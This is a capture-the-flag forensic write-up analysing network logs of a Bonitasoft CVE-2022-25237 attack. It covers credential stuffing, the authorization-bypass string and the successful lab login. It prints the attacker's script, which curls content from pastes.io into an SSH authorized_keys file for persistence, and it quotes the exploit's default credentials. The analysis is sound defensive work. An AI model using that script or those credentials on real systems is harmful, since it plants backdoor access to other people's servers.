Searching through the logs of the file `meerkat-alerts.json` I noticed some alerts involving the words `EXPLOIT`, `Attempted Administrator Privilege Gain` and the CVE `2022_25237`. 

![Desc](./assets/01%20-%20bonita-soft-found.png)

A quick search of this CVE revealed this `CVE-2022-25237` is a critical authorization bypass vulnerability in `Bonitasoft Bonita Web`. By appending a crafted string to the API URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions to deploy malicious code onto the server.

More information in https://nvd.nist.gov/vuln/detail/CVE-2022-25237

I used the `jq` tool to parse the json file by running this command `jq '.[].alert.signature' meerkat-alerts.json`. This command filters only the alerts, this way confirming the explotaition of `Bonitasoft`.

Continuing, I saw a lot of requests of the login type `POST /bonita/loginservice HTTP/1.1  (application/x-www-form-urlencoded)`.

![Desc](./assets/02%20-%20bonita-logins.png)

Taking a look at the kind of credentials used, they seem like valid usernames and passwords as if they were found in the dark web. That way, I concluded that this is a `Credential Stuffing` type of brute force attack.

Checking the folowwing packages, I discovered the string that was appended to the API URL path to bypass the authorization filter by the attacker's exploit: `i18ntranslation`.

![Desc](./assets/03%20-%20string-attached-to-api.png)

To check the usernames and passwords used by the attackers I used `tshark` running this command:

```sh
tshark -Y '(http.request.uri == "/bonita/loginservice") && (http.user_agent == "python-requests/2.28.1")' -r meerkat.pcap -T json | jq '.[]._source.layers.http."http.file_data"' | sort | uniq | wc -l
```

`-Y` to use filters from Wireshark

`-r` to read the pcap file

`-T` to convert the output to json

`|` to pipe the output into the jq tool

`.[]` tells jq to drill into the main json list output, then the `_source` key, then `layers`, then `http` and finally the value inside the `file_data` key.

`sort` and `uniq`. This two commands extract only the unique entries.

`wc -l` to count the lines of the output, which returns 57. But, taking a look at the <a href="https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2022-25237/CVE-2022-25237.py#L57">exploit</a> we can see that it tries default credentials each time:

```py
bonita_default_user = "install"
bonita_default_password = "install"
```

We can confirm that by taking a look at the packets:

![Desc](./assets/04%20-%20default-credentials.png)

So, we should rest 1 to the numbers of credentials used, which is `56`.

In order to know which username and password combination was successful, I applied this filter in Wireshark `http.request.uri == "/bonita/loginservice"`. Then I searched for the last packet and found out the credentials used: `seb.broom@forela.co.uk:g0vernm3nt`.

![Desc](./assets/05%20-%20credentials-found.png)

Besides, inspecting following the HTTP stream we see the prescense of `HTTP/1.1 204` status code which means `successfull`, when in the other packets was `401` which means `unauthorized`.

By checking in Statistics - HTTP - Requests in Wireshark, I was able to see the command used by the attacker and noticed the url `pastes.io`, used by the attacker to download a payload.

![Desc](./assets/06%20-%20url%20found.png)

Opening the `https://pastes.io/raw/bx5gcr0et8`, I found this

```sh
#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart
```

I saw that the attacker is copying the content of the file `hffgra4unv` into the `authorized_keys` file, used by the attacker to gain persistence on the host.

`/home/ubuntu/.ssh/authorized_keys` is the route of the file modified to gain access.

A quick search showed that `T1098.004` is the MITRE technique ID of this type of persistence mechanism.





